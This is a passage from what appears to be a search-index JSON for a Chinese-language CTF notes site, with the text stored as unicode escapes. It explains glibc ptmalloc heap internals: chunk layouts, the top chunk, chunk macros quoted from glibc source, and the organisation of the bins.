\u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524d chunk \u4f7f\u7528\u3002 \u8fd9\u5c31\u662f chunk \u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 \u5df2\u7ecf\u88ab\u5206\u914d\u4f7f\u7528\u7684 chunk \u7ed3\u6784\u5982\u4e0b\u4e24\u4e2a\u56fe\uff1a\uff08\u56fe\u4e00\u56fe\u4e8c size \u4f4d A \u4e0e N \u76f8\u540c\u542b\u4e49\u53ea\u662f\u8868\u793a\u4e0d\u540c\uff09 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes | A | M | P | mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . ( malloc_usable_size () bytes ) . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk, but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"malloc_chunk (allocated chunk)"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#free_chunk","text":"\u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head: ' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684 size \u5b57\u6bb5\u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u884c size \u4f4d\uff09 \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u5012\u6570\u7b2c\u4e8c\u884c nextchunk \u7684 prevsize \u4f4d\uff09 \u4e00\u822c\u60c5\u51b5\u4e0b \uff08fastbin\u4e2d\u5b58\u5728\u7279\u4f8b\uff09\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */","title":"free_chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#top-chunk","text":"glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684 top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002 top chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin \uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684 bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c top chunk \u5927\u5c0f\u4e0d\u5c0f\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff0c\u5c31\u5c06\u8be5 top chunk \u5206\u4f5c\u4e24\u90e8\u5206\uff1a\u7528\u6237\u8bf7\u6c42\u7684 chunk \u548c \u5269\u4f59\u7684\u90e8\u5206\uff08\u6210\u4e3a\u65b0\u7684 top chunk \uff09\u3002\u5426\u5219\uff0c\u5c31\u5bf9 heap \u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728 main arena \u4e2d\u901a\u8fc7 sbrk \u6269\u5c55 heap \uff0c\u800c\u5728*thread arena* \u4e2d\u901a\u8fc7 mmap \u5206\u914d\u65b0\u7684 heap \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a 1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684 chunk \u5c31\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002","title":"top chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#last-remainder","text":"\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \uff08bin\u4e2d\u7684chunk\uff09\u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin \u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3a last remainder\u3002","title":"last remainder"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk_1","text":"\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem \u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e chunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914d MINSIZE \u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6 chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2a chunk \u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524d chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6e chunk \u7684 size \u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684 chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904 chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE))","title":"chunk \u76f8\u5173\u5b8f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#bin","text":"","title":"bin \u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_11","text":"\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684 chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684 chunk \u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a 4 \u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\uff08\u5355\uff09\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk \u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cptmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9b bin \u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; \u4e00\u4e2a bin \u76f8\u5f53\u4e8e\u4e00\u4e2a chunk \u94fe\u8868\uff0c\u6211\u4eec\u628a\u6bcf\u4e2a\u94fe\u8868\u7684\u5934\u8282\u70b9 chunk \u4f5c\u4e3a bins \u6570\u7ec4\uff0c\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u5934\u8282\u70b9\u4f5c\u4e3a bin \u8868\u5934\uff0c\u5176 prev_size \u4e0e size \u5b57\u6bb5\u662f\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684\u65f6\u5019\u4ec5\u4ec5\u53ea\u9700\u8981\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684 fd \u548c bk \u5373\u53ef\uff0c\u800c\u5176\u4e2d\u7684 prev_size \u4e0e size \u5b57\u6bb5\u88ab\u91cd\u7528\u4e3a\u53e6\u4e00\u4e2a bin \u7684\u5934\u8282\u70b9\u7684 fd \u4e0e bk\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u56e0\u6b64**\u6211\u4eec\u4ec5\u4ec5\u53ea\u9700\u8981 mchunkptr \u7c7b\u578b\u7684\u6307\u9488\u6570\u7ec4\u5c31\u8db3\u591f\u5b58\u50a8\u8fd9\u4e9b\u5934\u8282\u70b9**\uff0c\u90a3 prev_size \u4e0e size \u5b57\u6bb5\u5230\u5e95\u662f\u600e\u4e48\u91cd\u7528\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1 \u7684 fd/bin2 \u7684 prev_size bin1 \u7684 bk/bin2 \u7684 size bin2 \u7684 fd/bin3 \u7684 prev_size bin2 \u7684 bk/bin3 \u7684 size bin \u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2a bin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2a bin \u7684\u8868\u5934 chunk \u4f1a\u91cd\u7528\u524d\u9762\u7684 bin \u8868\u5934 chunk \u7684 fd \u4e0e bk \u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3a\u5176\u81ea\u8eab\u7684 prev_size \u548c size \u5b57\u6bb5\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin \u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2a bin \u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin \u8868\u5934\u7684 chunk \u5934\u8282\u70b9 \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5176\u5b83 bin \u8868\u5934 chunk \u7684 fd \u548c bk \u5b57\u6bb5\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \uff08\u7d22\u5f15\uff09\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2 \u4e2a\u673a\u5668\u5b57\u957f \uff0c\u5373 32 \u4f4d\u76f8\u5dee 8 \u5b57\u8282\uff0c64 \u4f4d\u76f8\u5dee 16 \u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684 chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684 chunk \u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u5728 glibc \u4e2d\u7528\u4e8e\u8bb0\u5f55 bin \u7684\u6570\u636e\u7ed3\u6784\u6709\u4e24\u79cd\uff0c\u5206\u522b\u4e3a\uff1a fastbinsY : \u8fd9\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u6240\u6709\u7684 fast bin bin \u6570\u7ec4: \u8fd9\u4e5f\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709 bin \u3002\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u6570\u7ec4\u5171\u6709 126 \u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: [1] \u4e3a unsorted bin [2~63] \u4e3a small bin [64~126] \u4e3a large bin \u56de\u987e malloc_chunk \u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u4e2d\u7684 fd \u548c bk \u6307\u9488\u5c31\u662f\u6307\u5411\u5f53\u524d chunk \u6240\u5c5e\u7684\u94fe\u8868\u4e2d forward chunk \u6216\u8005 backward chunk \uff0c \u56e0\u6b64\u4e00\u822c\u7684 bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868 \uff08\u6709\u4f8b\u5916\uff09\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9b bin 